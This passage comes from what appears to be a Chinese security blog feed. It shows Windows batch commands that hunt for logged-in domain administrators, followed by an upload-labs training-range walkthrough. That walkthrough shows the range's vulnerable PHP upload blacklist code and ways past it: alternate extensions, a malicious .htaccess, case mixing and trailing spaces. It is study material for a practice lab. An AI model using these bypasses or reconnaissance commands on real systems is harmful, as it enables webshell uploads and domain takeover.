admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) DO @<span class="hljs-built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found running a process on %i &amp;&amp; pause<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154459571.png" alt="image-20240107154459571"></p><p><strong>2.2 扫描远程系统的NetBIOS信息</strong><br>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154508157.png" alt="image-20240107154508157">使用nbtscan工具，就文件与nbtscan工具置于同一目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154516874.png" alt="image-20240107154516874"></p><p>参考：<a href="https://blog.csdn.net/weixin_45007073/article/details/114498146">https://blog.csdn.net/weixin_45007073/article/details/114498146</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域管理员信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上次靶场练习</title>
    <link href="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>注意：这里的环境要为php5.6以下没有nts的<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170012951.png" alt="image-20240107170012951"></p><p><strong>Pass-01</strong><br>直接上传图片码抓包修改后缀即可<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170021394.png" alt="image-20240107170021394"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170030055.png" alt="image-20240107170030055"><br><strong>Pass-02</strong><br>同样上传图片码抓包修改后缀即可，比Pass-01多了个对MIME的检测，但对于上传图片码来说就没啥区别<br><strong>Pass-03</strong><br>查看源码<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170041535.png" alt="image-20240107170041535"><br>后台进行了黑名单限制，但是黑名单不完整，常见的可执行PHP文件的后缀：<br>php2、php3、php5、phtml、pht  当然这个的是配置文件里有才行</p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170050213.png" alt="image-20240107170050213"></p><p><strong>Pass-04</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //收尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到这个黑名单黑的很死，但是却漏了htaccess,我们可以上传一个.htaccess的配置文件，从而绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170111977.png" alt="image-20240107170111977"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SetHandler application/x-httpd-php<br><span class="hljs-comment">#就是让所有的文件都当作php文件解析</span><br></code></pre></td></tr></table></figure><p>此时我们在上传一个图片码就行了<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170123865.png" alt="image-20240107170123865"></p><p><strong>Pass-05</strong><br>看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看出常规的后缀名都禁了，但是可以大小写混写绕过，当然这个目标运行环境得为windows<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170136415.png" alt="image-20240107170136415"></p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170150976.png" alt="image-20240107170150976"><br><strong>Pass-06</strong><br>查看源码，将所有后缀转为小写在比对，所有大小写混写是行不通了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Windows解析特点：如果后缀名的最后一位是空格，系统会自动把空格给删掉<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170200931.png" alt="image-20240107170200931"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170208777.png" alt="image-20240107170208777"><br><strong>Pass-07</strong></p><p>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span 